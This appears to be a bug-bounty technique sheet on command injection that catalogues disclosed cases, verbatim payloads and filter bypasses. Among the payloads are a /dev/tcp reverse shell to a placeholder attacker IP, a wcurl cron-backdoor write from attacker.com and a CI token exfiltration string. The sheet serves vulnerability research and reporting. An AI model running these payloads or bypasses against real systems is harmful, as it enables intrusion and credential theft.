---
name: hunter-l3-command-injection
description: "Use when hunting Command Injection on a target. Loads the L3 technique sheet: Command injection is the class of bugs where attacker-controlled data reaches a shell interpreter (exec(), system(), Process.Start, backticks, child_process.exec, Kernel#open, docker/git/hg/apt comman"
domain: cybersecurity
subdomain: web
tags:
- web
- command-injection
- hunting
- l3
version: '1.0'
---

# Command Injection — Technique Sheet

## Overview

Command injection is the class of bugs where attacker-controlled data reaches a shell interpreter (exec(), system(), Process.Start, backticks, child_process.exec, Kernel#open, docker/git/hg/apt command lines) without proper escaping, allowing arbitrary OS command execution. It pays on device firmware web UIs (AirOS/EdgeSwitch/ToughSwitch), CI/CD and orchestration platforms (Airflow, GitHub Actions/Enterprise, AWS CDK), developer tooling (git wrappers, wcurl, node --run), and npm/rubygems libraries invoked on untrusted input. Proven impact ranges from unauthenticated root RCE to lateral compromise of CI tokens and appliance takeover; the recurring prize is that injection happens in trusted-utility code paths where developers assume input is "just a filename" or "just a version string."

## Distinct sub-patterns

### 1. Classic CGI parameter → exec() on embedded device firmware
- Shape: `GET /sptest_action.cgi?target=<host>`; `POST /dl-fw.cgi` with `fw_url`; EdgeSwitch CGI scripts. Attacker-authenticated (sometimes read-only) user.
- Payload (verbatim): `192.168.0.100;touch /tmp/vulnerable;` (id=119317); `http://www.nccgroup.trust/testtest123/` + backtick telnetd (id=121940); `;id` (id=197958).
- Root cause: CGI script passes parameters unsanitized into `exec()` (sptest.inc line 46; dl-fw.cgi shell exec).
- Impact: arbitrary shell commands as root on the device; Privilege-1 → Privilege-15 escalation on EdgeSwitch; reverse shell on airOS.
- Exemplars: 119317, 121940, 197958.

### 2. Server-controlled response data (headers/cookies) injected into client-side exec()
- Shape: AirOS speed-test feature. Attacker runs a rogue "speed test server"; victim device connects and parses the response.
- Payloads (verbatim): `Set-Cookie: AIROS_`reboot`=12345678901234567890123456789012` (id=128750); `Location: https://192.168.1.100/login.cgi `reboot`` (id=139398).
- Root cause: `parseHeaders`/`fetchCookies` (remote.inc:117) does not sanitize the peer server's Set-Cookie or 302 Location header before concatenating into a shell command via exec() during doLogin.
- Impact: RCE on the device even when the attacker has only network position, not credentials.
- Exemplars: 128750, 139398. Payload not stated for the ToughSwitch variant (273449) — CSRF'd command request achieving authenticated RCE.

### 3. Filename-as-command (Ruby Kernel#open pipe behavior)
- Shape: any Ruby API accepting a filename and calling `open()` / `Kernel#open` — `ruby -run -e wait_writable`, `rdoc --all`, `NET::Ftp gettextfile(remotefile, localfile)`.
- Payloads (verbatim): `| touch evil.txt` (id=1158824); `| touch evil.txt && echo tags` (id=1161691); `| os command` (id=294462).
- Root cause: `open("...")` with a leading `|` executes the string as a shell command (pipe-open). The rdoc case fires when the filename matches `/tags$/i` (remove_unparseable).
- Impact: arbitrary command execution — e.g., file `pang` created containing `id` output.
- Exemplars: 1158824, 1161691, 294462.

### 4. Naive string interpolation into Ruby command-line wrappers
- Shape: `git fastclone <repo>` with a malicious repo/submodule URL.
- Payload (verbatim): `git fastclone "'"'$(cat /etc/passwd >&2)'"'"` (id=105190).
- Root cause: strings built with plain Ruby interpolation into `Cocaine::CommandLine.new`, which does not protect interpolated arguments.
- Impact: shell command (`cat /etc/passwd`) executed during clone.
- Exemplar: 105190.

### 5. Airflow: user-controlled DAG parameters → BashOperator
- Shape: `POST /trigger`, `POST /dags/example_bash_operator/trigger` (Trigger DAG w/ config); parameters `foo`, `my_param`, `run_id`, and dataset `extra` fields on `POST /api/v1/datasets/events`.
- Payloads (verbatim): `{"foo":"\";touch /tmp/pwnedaaaaa;\""}` (id=1492896); `` `touch /tmp/success` `` in `run_id` (id=1776476); `{"dataset_uri":"s3://output/1.txt","extra":{"hi":" '$(gnome-calculator)' "}}` (id=2705661).
- Root cause: Jinja-templated or concatenated `bash_command` / dataset event handler receives user input without sanitization; run_id interpolated directly.
- Impact: arbitrary OS commands and reverse shell on the Airflow host (CVE-2022-40127).
- Exemplars: 1492896, 1776476, 2705661.

### 6. OS-config fields on appliance admin panels (GitHub Enterprise pattern)
- Shape: Management Console settings — service URL (actions-console), HTTP proxy (ghe-update-check), syslog-ng config, collectd username/password, Nomad templates (SMTP / audit-log forwarding).
- Payload (verbatim, one case): `http://127.0.0.1:8080;id` (id=2325023).
- Root cause: setting values are embedded into shell commands or config consumed by shell-executing processes without escaping.
- Impact: editor-role user escapes to root SSH access on the GHES appliance (CVE-2024-1355, CVE-2024-1359). Chain: authenticate with editor role → inject via the setting → execute as root.
- Exemplars: 2323292, 2325023, 2329466, 2329547, 2332551, 2332623. Payloads not stated in most.

### 7. npm/Node library argument → child_process.exec()
- Shape: any npm module concatenating an argument into exec/execSync/execa.shell:
  - `macaddress.one(iface)` — payload: `../../../etc/passwd; touch /tmp/poof; echo ` (id=319467)
  - `open(url)` — payload: `require("open")("http://example.com/`touch /tmp/tada`")` (id=319473)
  - `command-exists(commandName)` — payload: `ls; touch /tmp/foo0` (id=324453)
  - `fs-path.copySync(target)` — payload: `/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar` (id=324491)
  - `pdfinfojs getInfo(filename)` — payload: `$({touch,a})` (id=330957)
  - `gitDummyCommit(msg)` — payload: `";touch a;"` (id=341710)
  - `eggctl --stderr` — payload: `--stderr=/tmp/eggctl_stderr.log; touch /tmp/malicious` (id=388936)
  - `kill-port(port)` — payload: `kill("23;`touch ./success.txt; 2222222222`")` (id=389561)
  - `ascii-art preview target` — payload: `ascii-art preview 'doom"; touch /tmp/malicious; echo "'` (id=390631)
- Root cause: argument concatenated into a shell command string handed to exec()/execSync() without escaping — even "safe-looking" values like ports, paths, or URLs.
- Impact: arbitrary command execution on any machine running the code with attacker-influenced input.
- Exemplars: see per-module IDs above.

### 8. Batch-file argument injection on Windows (BatBadBut family)
- Shape: `child_process.spawn`/`spawnSync` (even with `shell:false`) executing .bat/.cmd files; Rust `std::process::Command` with trailing whitespace/periods in filename.
- Payload: not stated. Root cause: Windows batch argument escaping cannot be made safe; incomplete CVE-2024-27980 fix (id=2461831); trailing dots/spaces stripped so escaping bypassed (id=2721478, CVE-2024-43402).
- Impact: arbitrary command injection on Windows despite "no shell" invocation.
- Exemplars: 2461831, 2721478.

### 9. Malformed quoting in POSIX single-quote escaping
- Shape: `node --run <script> -- <args>`; AWS CDK `OsCommand.writeJson()` wrapping npm dependency versions.
- Payloads (verbatim): `SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #` (id=3817602); `"lodash": "4.17.21' && touch /asset-input/pwned_via_json.txt && echo '"` (id=3637898).
- Root cause: `EscapeShell()` escapes embedded single quotes as `\'`, which is ineffective inside POSIX single quotes — the quote closes the argument and shell syntax executes. CDK wraps data in single quotes without escaping embedded quotes (posixShellEscape unused), injecting into a Docker `bash -c`.
- Impact: RCE as the running user (whoami returned root); CDK case runs inside Docker with bind mounts — enables exfiltration of `.env`/AWS credentials and backdooring Lambda artifacts via a malicious npm version string.
- Exemplars: 3817602, 3637898.

### 10. Argument injection via leading `--` options
- Shape: `git.LSRemoteExec()` in kubernetes-sigs/release-sdk; Mercurial branch name in Phabricator `GET /source/{repo}/history/{branch}`; wcurl `--curl-options`; curl wrapper `-guid {input}`.
- Payloads (verbatim): `--upload-pack=touch${IFS}hack` (id=1763704); `--config=hooks.pre-log=wget` as branch name (id=288704); `wcurl --dry-run --curl-options='-o /etc/cron.d/backdoor' https://attacker.com/malicious` (id=3523953); `123 -o /etc/shadow` (id=3648199).
- Root cause: user input concatenated without a `--` separator or quoting, so it parses as a command-line flag — git `--upload-pack` runs arbitrary commands, hg `--config=hooks.pre-log=...` defines a hook that runs during `hg log`, curl `-o`/`-T`/`--engine` write/exfiltrate files or load engines.
- Impact: file creation, file overwrite (`/etc/shadow`), backdoor at `/etc/cron.d`, RCE.
- Exemplars: 1763704, 288704, 3523953, 3648199 (the last hypothetical, not executed).

### 11. Custom URI schemes / desktop app launch paths
- Shape: `NordVPN.Notification:` custom protocol (Windows) with attacker `OpenUrl` argument (base64/LZMA blob delivered via iframe, id=1001255); Jitsi desktop browser-launch on Windows (id=1692603, CVE-2022-43550 — payload not stated); Burp Suite embedded Chrome remote debugging → malicious `user.vmoptions` with `-Xmx5m` and `-XX:OnOutOfMemoryError=open -a Calculator` (id=1274695).
- Root cause: OS-level handlers pass attacker strings into Process.Start or browser-launch command lines; desktop app config files/flags become execution vectors.
- Impact: calc.exe launched with user permissions on Windows after user interaction; RCE via vmoptions after restart.
- Exemplars: 1001255, 1692603, 1274695.

### 12. VCS/SSH-related shell injection
- Shape: `ssh://` URIs to git/svn/hg clone; libssh client ProxyCommand/ProxyJump hostname; Apport crash-file handling; malformed hg repo triggering git subrepo `.git/hooks/post-update`.
- Payloads: `` `touch /tmp/pwned` `` as hostname (id=2293731); ssh:// URI patterns (id=260005, payload summarized); checked-in `.git/hooks/post-update` script (id=294147).
- Root cause: VCS tools pass ssh:// URIs to the shell (CVE-2017-9800, CVE-2017-1000116/7); unchecked hostname expanded into ProxyCommand shell line; crafted repo causes hook execution.
- Impact: RCE on clone/ssh/patch-processing machines. Exemplars: 260005, 2293731, 294147, 192512 (payload not stated for Apport; RCE on default Ubuntu Desktop upon opening a file).

### 13. Interpolation into config/templates consumed by shell-like executors
- Shape: Hyperledger Indy `POOL_UPGRADE` ledger transaction `package` field; Airflow-adjacent Jinja; GitHub Actions `pull_request.name` inside double quotes in a run command; git branch names embedded in bash `PS1` prompt.
- Payloads (verbatim): `indy-node2 `touch /tmp/1234567`` (id=1859592); `U";cat $GITHUB_WORKSPACE/.git/config | xxd -p | base64; echo "D` in PR title (id=2471956); `$(touch${IFS}/tmp/pwned)` in branch name (id=1785378).
- Root cause: `compose_cmd` strips only `;`, `|`, `&&` — backticks pass; PR names interpolated in double quotes allow `";` breakout; PS1 evaluates command substitution when victim cd's into the repo.
- Impact: Trustee runs commands on any node; GITHUB_TOKEN exfiltrated from runner logs (org compromise); command execution on developer's machine.
- Exemplars: 1859592, 2471956, 1785378.

### 14. Adjacent/related injection primitives seen in records
- IRC command injection via unvalidated channel name: `#treehouse'){%0a%0dQUIT` (id=29480) — same class of unescaped-metacharacter bug against a different protocol parser.
- PHP deserialization gadget to command execution: unauthenticated Liferay `/api/jsonws/invoke` with c3p0 `WrapperConnectionPoolDataSource` → `HexAsciiSerializedMap` → ran `systeminfo` on Windows Server 2019 (id=2742457, CVE-2020-7961).
- Shell-adjacent exec with unsanitized settings: ownCloud `OC_User_SMB smb.php` host param (`smbclient //host -Uuser%pass` injection, code exec on every login as persistence, id=148151); Roundcube Password virtualmin driver payload `";id;"` (id=2421957/2421962-listed as 242119, CVE-2017-8114); ExpressionEngine `delete_directory` exec() without escapeshellarg (id=250587); ExpressionEngine channel-set PHP upload via predictable temp-folder name (id=335761).
- Node.js git env escape in Actions runner: untrusted env var input escapes into the docker command invocation (CVE-2022-39321, id=1637621, payload not stated).
- Trellix: `..;/` path traversal bypassing AJP ProxyPass to reach unauthenticated internal API, then reverse shell payload `` `bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1` `` in `name` (id=2817658) — RCE as root.
- OpenSSH/dropbear xauth quoting (id=122113, payload not stated): injection into xauth command line bypasses forced-command and `/bin/false` shells; arbitrary file read/write.
- K8s/AirOS/XSS-chained CSRF: AirOS stored-XSS → CSRF bypass → command injection (id=289264, payload not stated).

## Bypass / chain notes

- Filter stripping only `;`, `|`, `&&` — use backticks (id=1859592) or `$()` with `${IFS}` for spaces (id=1763704, 1785378).
- `\'` "escaping" inside POSIX single quotes is a no-op — close the quote and re-open (id=3817602, 3637898).
- Argument injection sidesteps shell-escaping entirely when no `--` separator exists: leading `--config=`, `--upload-pack=`, `-o` flags (ids 288704, 1763704, 3648199, 3523953).
- Windows: batch files defeat `shell:false` guarantees (ids 2461831, 2721478); trailing whitespace/periods in filenames strip to re-enable the vuln path.
- Multi-step chains observed: XSS → IPC/dispatch in Electron-style apps (id=188561: Array.prototype.push override payload verbatim); clickjacking + JS port sniffing → debugging GUID → vmoptions write → OnOutOfMemoryError execution on restart (id=1274695); stored-XSS → CSRF bypass → command injection on device (id=289264); `..;/` AJP traversal → unauthenticated API → injection → root reverse shell (id=2817658); malicious repo/submodule or PR title → CI runner → token exfiltration (ids 105190, 2471956).
- Attacker-controlled server responses (Set-Cookie, 302 Location) turned into device RCE without credentials (ids 128750, 139398).

## Gotchas / what NOT to do

- Do not assume `shell:false` or spawn-without-shell is safe on Windows when batch files are involved.
- Don't rely on the platform's naive escape function — verify it handles embedded quotes inside single-quoted strings and `${IFS}` tokenization.
- Argument injection (leading `--`) often bypasses fixes aimed only at shell metacharacters; check for `--` separators.
- Filtering blocklists (`;`, `|`, `&&`) is the reported root cause in multiple bugs — backticks and `$()` still fire.
- Some reported cases were hypothetical/not executed (id=3648199) — mark them as such; don't claim demonstrated impact.
- Files with metacharacters in names only fire in specific triggers (rdoc: name matching `/tags$/i`) — read the trigger condition before testing.
- Web endpoints usually need some authentication level (read-only user on AirOS, editor role on GHES) — chain from CSRF/XSS when unauthenticated access is the goal.

## Real-world impact examples

- Unauthenticated root RCE: Liferay deserialization ran `systeminfo` on a DoD Windows host (id=2742457); Trellix `..;/` + injection yielded a root reverse shell (id=2817658).
- Device takeover: airOS telnetd start + reverse shell via `fw_url` (id=121940); device reboot via Set-Cookie injection (id=128750); EdgeSwitch Privilege-1 → root command exec (id=197958).
- Org-level CI compromise: PR-title injection exfiltrated `GITHUB_TOKEN` from `.git/config` on the runner (id=2471956); GHES editor-role → admin SSH (root) via proxy setting `http://127.0.0.1:8080;id` (id=2325023).
- Developer-machine RCE: malicious git branch name executes on `cd` via PS1 (id=1785378); crafted repo executes commands on clone/patch processing (ids 105190, 294147); npm library flaws execute commands on every machine passing attacker data (ids 319467–390631).
- Credential/backdoor planting: wcurl `--curl-options='-o /etc/cron.d/backdoor'` (id=3523953); CDK npm-version injection creating host artifacts with bind-mount access to `.env` and AWS creds (id=3637898); ownCloud smb.php injection as login-time persistence (id=148151).